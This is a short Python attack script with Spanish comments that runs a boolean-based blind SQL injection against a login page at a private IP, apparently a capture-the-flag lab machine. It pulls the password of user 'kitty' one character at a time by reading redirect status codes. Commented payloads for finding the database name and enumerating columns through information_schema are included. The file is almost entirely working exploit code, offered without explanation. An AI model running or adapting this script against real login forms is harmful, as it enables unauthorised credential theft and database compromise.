#!/bin/env/python3
import requests
import sys
from urllib.parse import urljoin

#Medir la longitud de la database con este paylaod 
#sqlip = ' and LENGTH(database())>1-- -

#Encontrar la database:
#' AND SUBSTRING(database(), 1, 1) = '{i}'-- -
#f"' AND (SELECT SUBSTRING(column_name, {n}, 1) FROM information_schema.columns WHERE table_schema = 'mywebsite' AND table_name = 'siteusers' LIMIT 1) = '{i}' -- -"

ip_addres = "10.10.249.1"
url_login = urljoin(f'http://{ip_addres}/', "index.php")

caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|:;\"'<>,.?/~`"

tmp = ""
#Realizar la solicitud post
with requests.Session() as session:
    for n in range(1,15):
        for i in caracteres:
            #reemplzar el payload en medida de uso
            sqlip = f"' AND (SELECT SUBSTRING(password, {n}, 1) FROM siteusers WHERE username='kitty' LIMIT 1) = '{i}' -- -"
            #Ingreso de datos al script
            login ={
                'username': 'kitty' + sqlip,
                'password' : 'holamundo'
            }
            respuesta = session.post(url_login,data=login,allow_redirects=False)
            status_code = respuesta.status_code
            if status_code == 302:
                print(f"login full para {i}")
                tmp += i
                print(tmp)
            #Solicitud GET para cerrar sesi√≥n (logout.php)
                url_logout = urljoin(f'http://{ip_addres}/', "logout.php")
                logout_respuesta = session.get(url_logout)
                if logout_respuesta.ok:
                    continue
                else:
                    print("revisar respuestas")
            else:
                continue